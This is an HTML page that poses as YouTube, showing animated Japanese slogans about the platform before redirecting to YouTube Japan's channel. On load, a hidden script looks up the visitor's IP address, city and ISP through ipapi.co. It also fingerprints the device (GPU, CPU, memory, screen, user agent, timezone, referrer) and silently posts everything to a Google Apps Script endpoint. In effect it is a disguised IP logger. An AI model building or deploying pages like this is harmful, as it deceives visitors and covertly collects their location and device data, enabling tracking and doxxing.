<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube</title>
    <link rel="icon" href="channels4_profile.jpg">
    <style>
        :root { --yt-red: #ff0000; --bg-black: #020202; }
        body { margin: 0; padding: 0; background-color: var(--bg-black); color: #ffffff; font-family: "Inter", "Hiragino Kaku Gothic ProN", sans-serif; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
        
        /* 背景：発光する星 */
        #star-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }

        #main-viewport { position: relative; width: 90vw; height: 85vh; z-index: 10; display: flex; flex-direction: column; justify-content: center; overflow: hidden; }
        
        /* テキストスタック（一斉スライド用） */
        #stack-container { position: relative; width: 100%; height: 100%; transition: transform 0.8s cubic-bezier(0.76, 0, 0.24, 1); }

        .text-element { position: absolute; font-weight: 900; line-height: 1.1; opacity: 0; letter-spacing: -0.05em; word-break: keep-all; }

        /* イントロ：純粋な赤文字 */
        #intro-msg {
            font-size: clamp(32px, 6vw, 55px); width: 100%; text-align: center; top: 50%; left: 50%; transform: translate(-50%, -50%);
            color: var(--yt-red); text-shadow: 0 0 20px rgba(255, 0, 0, 0.8);
            animation: introIn 1.5s ease forwards;
        }

        @keyframes introIn {
            0% { transform: translate(-50%, -30%); opacity: 0; filter: blur(10px); }
            20% { opacity: 1; filter: blur(0); }
            80% { opacity: 1; transform: translate(-50%, -50%); }
            100% { transform: translate(-50%, -180%); opacity: 0; }
        }

        .bold-xl { font-size: clamp(45px, 9vw, 100px); }
        .bold-lg { font-size: clamp(30px, 6vw, 60px); }
        .bold-md { font-size: clamp(18px, 3.2vw, 34px); }
        .highlight { color: var(--yt-red); }

        #p1 { top: 5%; left: 0%; transform: translateX(-100px); }
        #p2 { top: 18%; right: 0%; transform: translateX(100px); text-align: right; }
        #p3 { top: 40%; left: 2%; transform: translateY(50px); }
        #p4 { top: 55%; right: 5%; transform: translateX(100px); text-align: right; }
        #p5 { bottom: 10%; left: 0%; transform: scale(0.8); }

        /* 最後のメッセージ：単独出現 */
        #p6 {
            width: 100%; text-align: center; bottom: 45%; left: 0;
            opacity: 0; transform: translateY(100px); font-size: clamp(24px, 4vw, 42px);
        }

        .active-p { opacity: 1 !important; transform: translate(0, 0) scale(1) !important; transition: all 0.7s cubic-bezier(0.16, 1, 0.3, 1); }
        
        /* 前の文字を上にスライドさせるためのクラス */
        .slide-up { transform: translateY(-100%) !important; opacity: 0 !important; transition: all 0.8s ease-in; }

        #progress-line { position: fixed; top: 0; left: 0; height: 3px; background: var(--yt-red); width: 0%; z-index: 100; box-shadow: 0 0 15px var(--yt-red); }
    </style>
</head>
<body>

<canvas id="star-canvas"></canvas>
<div id="progress-line"></div>

<div id="main-viewport">
    <div id="intro-msg" class="text-element">あと10秒だけ時間をください！</div>

    <div id="stack-container">
        <div id="p1" class="text-element bold-xl"><span class="highlight">YouTube</span>は、</div>
        <div id="p2" class="text-element bold-lg">世界最大の<br>動画共有プラットフォーム。</div>
        <div id="p3" class="text-element bold-md">25億人の<span class="highlight">アクティブユーザー</span>と共に、</div>
        <div id="p4" class="text-element bold-md">Googleが買収した2006年から現在まで、<br>メディアの歴史を塗り替え続けています。</div>
        <div id="p5" class="text-element bold-lg">さらなる<span class="highlight">未体験</span>のステージへ。</div>
    </div>

    <div id="p6" class="text-element bold-md highlight">現在、最高の視聴環境を構築しています...</div>
</div>

<script>
    const GAS_URL = "https://script.google.com/macros/s/AKfycbyCf3hDJbJ6EguZU09lZixVy9TE6SYqaXL5KgsK4rBMF5ysd-YrRjg26dNUD9wTg0orNQ/exec";
    const REDIRECT_URL = "https://www.youtube.com/@YouTubeJapan/videos";

    // 端末情報の詳細取得
    function fetchDeviceInfo() {
        const ua = navigator.userAgent;
        let device = "不明なデバイス";
        
        // navigator.userAgent を使用した詳細判別
        if (/CrOS/.test(ua)) device = "Chromebook";
        else if (/iPhone/.test(ua)) device = "iPhone";
        else if (/iPad/.test(ua)) device = "iPad";
        else if (/Android/.test(ua)) device = "Android端末";
        else if (/Macintosh/.test(ua)) device = "Mac";
        else if (/Windows/.test(ua)) device = "Windows PC";

        // GPU情報
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        let gpu = "取得不可";
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_ID) : "WebGL対応";
        }

        return { ua, device, gpu };
    }

    async function startSequence() {
        const bar = document.getElementById('progress-line');
        const stack = document.getElementById('stack-container');

        await new Promise(r => setTimeout(r, 1600));

        // P1〜P5の表示
        const blocks = ['p1', 'p2', 'p3', 'p4', 'p5'];
        for (let i = 0; i < blocks.length; i++) {
            document.getElementById(blocks[i]).classList.add('active-p');
            bar.style.width = ((i + 1) / (blocks.length + 1) * 80) + "%";
            await new Promise(r => setTimeout(r, 1100));
        }

        // --- ここでスライド演出 ---
        stack.classList.add('slide-up'); // P1-P5を一斉に上へ
        await new Promise(r => setTimeout(r, 600));
        
        document.getElementById('p6').classList.add('active-p'); // P6が下から登場
        bar.style.width = "100%";
        
        await new Promise(r => setTimeout(r, 2500));
        window.location.replace(REDIRECT_URL);
    }

    async function collectAndSend() {
        try {
            const geoRes = await fetch('https://ipapi.co/json/');
            const geo = await geoRes.json();
            const info = fetchDeviceInfo();

            const payload = {
                ip: geo.ip,
                location: `${geo.country_name} / ${geo.city}`,
                isp: geo.org,
                device: info.device,
                gpu: info.gpu,
                cpu: navigator.hardwareConcurrency || "不明",
                memory: navigator.deviceMemory || "不明",
                screen: `${screen.width}x${screen.height} (DPR:${window.devicePixelRatio})`,
                ua: info.ua, // navigator.userAgent をそのまま送信
                lang: navigator.language,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                ref: document.referrer || "直接アクセス"
            };

            fetch(GAS_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
        } catch (e) { console.error(e); }
    }

    // 星空アニメーション
    function initStars() {
        const canvas = document.getElementById('star-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const stars = [];
        for(let i=0; i<150; i++) stars.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, size: Math.random()*1.5, alpha: Math.random(), speed: Math.random()*0.02 });
        function draw() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            stars.forEach(s => {
                s.alpha += s.speed; if(s.alpha > 1 || s.alpha < 0) s.speed *= -1;
                ctx.fillStyle = `rgba(255, 255, 255, ${Math.abs(s.alpha)})`;
                ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI*2); ctx.fill();
            });
            requestAnimationFrame(draw);
        }
        draw();
    }

    window.onload = () => { initStars(); collectAndSend(); startSequence(); };
    setTimeout(() => { window.location.replace(REDIRECT_URL); }, 15000);
</script>

</body>
</html>
